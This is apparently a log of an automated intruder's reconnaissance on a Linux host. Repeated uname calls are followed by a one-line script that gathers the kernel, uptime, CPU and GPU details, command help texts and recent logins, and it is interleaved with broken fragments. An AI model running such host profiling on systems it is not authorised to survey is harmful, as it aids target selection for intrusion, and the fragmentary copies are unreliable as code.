uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 